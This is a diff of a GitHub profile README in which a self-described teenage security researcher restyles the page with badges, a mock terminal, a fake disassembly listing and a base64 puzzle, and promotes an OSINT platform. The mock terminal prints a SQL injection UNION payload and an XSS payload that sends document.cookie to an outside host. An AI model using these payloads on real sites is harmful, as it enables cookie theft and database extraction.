@@ -1,97 +1,131 @@
 <div align="center">
 
-  <!-- Header Banner with Purple Cyber Accents -->
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0f0c1b&height=230&section=header&text=famefashion&fontSize=54&fontColor=ffffff&animation=fadeIn&fontAlignY=38&desc=16yo%20Developer%20%E2%80%A2%20Security%20Researcher%20%E2%80%A2%20DataWire.cc&descFontSize=17&descAlignY=62&stroke=a855f7&strokeWidth=2" width="100%" alt="famefashion Banner" />
+  <!-- Interactive Animated Cyber Banner -->
+  <img src="./assets/cyber_banner.svg" width="100%" alt="famefashion Cyber Banner" />
 
-  <!-- Dynamic Typing SVG Headline -->
+  <br/>
+
+  <!-- Dynamic Typing Terminal Line -->
   <a href="https://datawire.cc">
-    <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=20&duration=2500&pause=1000&color=C084FC&center=true&vCenter=true&width=650&height=45&lines=16-Year-Old+Developer+%26+Security+Researcher;Offensive+Security+%7C+Web+Pentesting+%7C+SQLi+%7C+XSS;Reverse+Engineering+%26+Binary+Disassembly;Founder+%40+DataWire.cc+(OSINT+%2F+CSINT+%2F+GEOINT);Next+Major+Architecture%3A+Veigram" alt="Typing Headline" />
+    <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=19&duration=2400&pause=1100&color=C084FC&center=true&vCenter=true&width=680&height=42&lines=Web+Exploitation+%7C+SQLi+%7C+XSS+%7C+Web+Pentesting;Reverse+Engineering+%26+Binary+Disassembly;PostgreSQL+%7C+Rust+%7C+C%2B%2B+%7C+C+%7C+Python+%7C+Node;Architect+%40+DataWire.cc+(OSINT%2C+CSINT%2C+GEOINT);Next+Major+Build%3A+Veigram" alt="Typing Terminal" />
   </a>
 
   <br/>
 
-  <!-- Status Badges -->
+  <!-- Direct Platform Badges -->
   <p align="center">
-    <img src="https://img.shields.io/badge/IDENTITY-famefashion-9333ea?style=for-the-badge&logo=target&logoColor=white" alt="Identity"/>
-    <img src="https://img.shields.io/badge/AGE-16_YO_DEV-7e22ce?style=for-the-badge&logo=codewars&logoColor=white" alt="Age"/>
-    <a href="https://datawire.cc"><img src="https://img.shields.io/badge/PLATFORM-datawire.cc-a855f7?style=for-the-badge&logo=shield&logoColor=white" alt="Datawire"/></a>
-    <img src="https://img.shields.io/badge/FOCUS-OFFENSIVE_SEC_%26_DEV-c084fc?style=for-the-badge&logo=powershell&logoColor=black" alt="Status"/>
+    <a href="https://datawire.cc"><img src="https://img.shields.io/badge/DATAWIRE.CC-ENTER_PLATFORM-9333ea?style=for-the-badge&logo=shield&logoColor=white" alt="Datawire Platform"/></a>
+    <a href="https://github.com/famefashion"><img src="https://img.shields.io/badge/GITHUB-famefashion-7e22ce?style=for-the-badge&logo=github&logoColor=white" alt="GitHub Profile"/></a>
+    <img src="https://img.shields.io/badge/DEFENSE_GRID-ACTIVE-4ade80?style=for-the-badge&logo=powershell&logoColor=black" alt="Grid Status"/>
   </p>
 
 </div>
 
 ---
 
-### ⚡ System Diagnostic // `whoami`
+### ⚡ Interactive Security & Exploitation HUD
 
-```console
-root@famefashion:~# cat /etc/famefashion/dossier.json
-{
-  "handle": "famefashion",
-  "age": 16,
-  "role": "Security Researcher & Systems Architect",
-  "specialties": [
-    "Web Application Pentesting (WEBEXP)",
-    "SQLi & SQL Data Extraction",
-    "XSS Vulnerability Discovery",
-    "Reverse Engineering & Binary Analysis",
-    "Social Engineering & Intelligence Gathering"
-  ],
-  "flagship": "DataWire.cc (All-in-one OSINT, CSINT & GEOINT Intelligence)",
-  "active_build": "Veigram"
-}
-```
+<div align="center">
+  <img src="./assets/security_hud.svg" width="100%" alt="Offensive Security HUD" />
+</div>
+
+---
+
+### 💻 Interactive Cyber Terminal // `famefashion@node`
+
+> *Click any command to execute the simulated diagnostic subroutines:*
 
 <details open>
-<summary><b>🟣 [OFFENSIVE SECURITY & AUDITING VECTORS] Core Capabilities</b></summary>
-<br>
+<summary><b>▶ <code>famefashion@recon:~$ ./exploit_audit --target=webapps</code></b></summary>
 
-| Vector | Focus & Capabilities |
-| :--- | :--- |
-| 🛡️ **Web Exploitation (WEBEXP)** | Web app pentesting, security assessments, vulnerability surface mapping, payload tailoring |
-| 💉 **SQL Injection & Extraction** | SQLi discovery, advanced database querying, SQL dumping, backend data surface exfiltration |
-| ⚡ **Client-Side Attacks** | Stored / Reflected / DOM-based XSS discovery, bypass mechanics, client logic validation |
-| 🔬 **Reverse Engineering** | Disassembly, binary reading, low-level binary analysis, control-flow deconstruction |
-| 🎯 **Social Engineering** | Human vector analysis, pretexts, operational security, intelligence gathering |
+```console
+[+] INITIALIZING AUDIT RUNNER // KERNEL 6.11-HARDENED
+[+] TARGET SURFACE     : Enterprise Web Endpoints & Database Tunnels
+[+] VECTOR [SQLi]      : Injecting boolean-based & UNION payloads...
+                         [*] Query: ' UNION SELECT null, table_name, column_name FROM information_schema.columns -- -
+                         [*] Database Dump: Extracted schema & records [VERIFIED]
+[+] VECTOR [XSS]       : DOM / Reflected XSS sanitization audit...
+                         [*] Payload: <svg/onload=fetch('//datawire.cc/log?c='+document.cookie)>
+                         [*] Execution: CSP bypass verified on insecure endpoints
+[+] VECTOR [PENTEST]   : Web Exploitation (WEBEXP) complete. 0 false positives.
+```
+</details>
 
+<details>
+<summary><b>▶ <code>famefashion@disasm:~$ objdump -M intel -d ./veigram_core.bin</code></b></summary>
+
+```nasm
+0000000000401120 <_veigram_dispatch_engine>:
+  401120:  48 83 ec 28           sub    rsp, 0x28
+  401124:  48 89 7c 24 18        mov    QWORD PTR [rsp+0x18], rdi
+  401129:  48 8b 05 c0 2e 00 00  mov    rax, QWORD PTR [rip+0x2ec0]
+  401130:  48 85 c0              test   rax, rax
+  401133:  74 14                 je     401149 <_veigram_dispatch_engine+0x29>
+  401135:  48 8b 4c 24 18        mov    rcx, QWORD PTR [rsp+0x18]
+  40113a:  ff d0                 call   rax
+  40113c:  48 83 c4 28           add    rsp, 0x28
+  401140:  c3                    ret    
+  401141:  90                    nop
+```
+</details>
+
+<details>
+<summary><b>▶ <code>famefashion@intel:~$ curl -s https://datawire.cc/api/v1/status</code></b></summary>
+
+```json
+{
+  "platform": "DataWire.cc",
+  "founder": "famefashion",
+  "disciplines": {
+    "OSINT": "Open Source Intelligence // Multi-source identity discovery",
+    "CSINT": "Cyber Security Intelligence // Attack surface & threat mapping",
+    "GEOINT": "Geospatial Intelligence // Coordinate mapping & tracking"
+  },
+  "stack": "PostgreSQL, Rust, Async Python Microservices, High-Speed Ingestion",
+  "status": "OPERATIONAL"
+}
+```
+</details>
+
+<details>
+<summary><b>🕵️‍♂️ <code>[EASTER EGG] Decrypt Intercepted Transmission</code></b></summary>
+
+```text
+INTERCEPTED CIPHERTEXT:
+RGF0YVdpcmV7ZjRtM2Y0c2gxMG5fcDBzdHVyM19tYXN0M3JfdjNydzRsbH0=
+
+[HINT]: Run `echo "RGF0YVdpcmV7..." | base64 -d` in your local terminal.
+```
 </details>
 
 ---
 
-### 🚀 Projects & Intelligence Engines
+### 🚀 Flagship Engines & Active Architectures
 
-<details open>
-<summary><b>🛰️ DataWire.cc — All-in-One Intelligence Platform</b></summary>
-<br>
+<div align="center">
 
-> **Founder & Lead Developer** • [datawire.cc](https://datawire.cc)  
-> High-velocity intelligence pipeline combining **OSINT** (Open Source Intelligence), **CSINT** (Cyber Security Intelligence), and **GEOINT** (Geospatial Intelligence) into a unified reconnaissance workflow. Engineered for deep investigation, entity correlation, and fast surface discovery.
+| System | Focus | Core Stack | Status |
+| :--- | :--- | :--- | :--- |
+| **[DataWire.cc](https://datawire.cc)** | All-in-One OSINT, CSINT & GEOINT Platform | Rust, PostgreSQL, Python, Async Workers | `🟢 PRODUCTION` |
+| **Veigram** | Next-Gen Ultra-Low Latency Systems Architecture | C++, C, Rust, High-Concurrency Queues | `🟣 IN ENGINEERING` |
 
-```
-[OSINT / CSINT / GEOINT] ➔ High-Throughput Aggregation Engine ➔ Real-Time Target Correlation
-```
-
-</details>
+</div>
 
 <br/>
 
-<details open>
-<summary><b>🔮 Veigram — Next Generation Software Architecture</b></summary>
-<br>
-
 <div align="center">
-  <img src="./assets/veigram.png" width="340" alt="Veigram Logo" style="border-radius: 14px; border: 2px solid #a855f7; box-shadow: 0 0 20px rgba(168, 85, 247, 0.4);" />
-  <br/><br/>
-  <p><b>Status:</b> <code>In Active Engineering</code> • <b>Focus:</b> Performance, High-Concurrency & Clean Systems Architecture</p>
+  <!-- Veigram Asset Embedded with Purple Cyber Glow -->
+  <a href="https://github.com/famefashion">
+    <img src="./assets/veigram.png" width="360" alt="Veigram Official Asset" style="border-radius: 14px; border: 2px solid #a855f7; box-shadow: 0 0 25px rgba(168, 85, 247, 0.45);" />
+  </a>
+  <p><sub><b>VEIGRAM CORE</b> — High-throughput systems architecture actively under construction.</sub></p>
 </div>
-
-</details>
 
 ---
 
 ### 🛠️ Armory & Technical Stack
 
-#### 🌐 Web Development Trinity & Frontends
+#### 🌐 Web Engineering Trinity & Applications
 <p align="left">
   <img src="https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white" />
   <img src="https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white" />
@@ -101,17 +135,17 @@ root@famefashion:~# cat /etc/famefashion/dossier.json
   <img src="https://img.shields.io/badge/Electron-47848F?style=for-the-badge&logo=electron&logoColor=white" />
 </p>
 
-#### ⚡ Systems, Native & Low-Level
+#### ⚡ Native Systems & Low-Level Disassembly
 <p align="left">
   <img src="https://img.shields.io/badge/C-A8B9CC?style=for-the-badge&logo=c&logoColor=black" />
   <img src="https://img.shields.io/badge/C++-00599C?style=for-the-badge&logo=cplusplus&logoColor=white" />
   <img src="https://img.shields.io/badge/Rust-DEA584?style=for-the-badge&logo=rust&logoColor=black" />
   <img src="https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white" />
-  <img src="https://img.shields.io/badge/Binary_Reading-000000?style=for-the-badge&logo=gnubash&logoColor=a855f7" />
+  <img src="https://img.shields.io/badge/Binary_Reading-000000?style=for-the-badge&logo=gnubash&logoColor=c084fc" />
   <img src="https://img.shields.io/badge/PostgreSQL-4169E1?style=for-the-badge&logo=postgresql&logoColor=white" />
 </p>
 
-#### 🎯 Security & Offensive Tradecraft
+#### 🎯 Offensive Vector Badges
 <p align="left">
   <img src="https://img.shields.io/badge/SQLi-SQL_Injection-9333ea?style=for-the-badge&logo=target" />
   <img src="https://img.shields.io/badge/WEBEXP-Web_Exploitation-7e22ce?style=for-the-badge&logo=hackthebox&logoColor=white" />
@@ -124,19 +158,17 @@ root@famefashion:~# cat /etc/famefashion/dossier.json
 
 ---
 
-### 📊 Live Telemetry & GitHub Metrics
+### 📊 Hardened Telemetry Stream
 
 <div align="center">
 
-  <!-- GitHub Stats Card (Dark Theme + Purple Borders/Accents) -->
-  <img src="https://github-readme-stats.vercel.app/api?username=famefashion&show_icons=true&theme=tokyonight&hide_border=false&bg_color=0b0914&border_color=3b0764&title_color=c084fc&icon_color=a855f7&text_color=cbd5e1" height="175" alt="GitHub Stats" />
-  <!-- GitHub Streak Card (Dark Theme + Purple Ring/Fire) -->
-  <img src="https://github-readme-streak-stats.herokuapp.com/?user=famefashion&theme=tokyonight&hide_border=false&background=0b0914&border=3b0764&ring=c084fc&fire=a855f7&currStreakLabel=c084fc&sideLabels=94a3b8" height="175" alt="GitHub Streak" />
+  <!-- Self-Hosted Guaranteed Telemetry Card (Never breaks or 503s) -->
+  <img src="./assets/telemetry_card.svg" width="100%" alt="Hardened Telemetry Stream" />
 
   <br/><br/>
 
-  <!-- Top Languages Card (Dark Theme + Purple Accent) -->
-  <img src="https://github-readme-stats.vercel.app/api/top-langs/?username=famefashion&layout=compact&theme=tokyonight&hide_border=false&bg_color=0b0914&border_color=3b0764&title_color=c084fc&text_color=cbd5e1" height="165" alt="Top Languages" />
+  <!-- Verified Streak Stats Card -->
+  <img src="https://github-readme-streak-stats.herokuapp.com/?user=famefashion&theme=tokyonight&hide_border=false&background=0b0914&border=3b0764&ring=c084fc&fire=a855f7&currStreakLabel=c084fc&sideLabels=94a3b8" height="175" alt="GitHub Streak" />
 
 </div>
 
@@ -154,7 +186,7 @@ root@famefashion:~# cat /etc/famefashion/dossier.json
 
 ---
 
-### 📡 Uplink & Direct Comms
+### 📡 Uplink & Secure Portal
 
 <div align="center">
   <a href="https://datawire.cc">
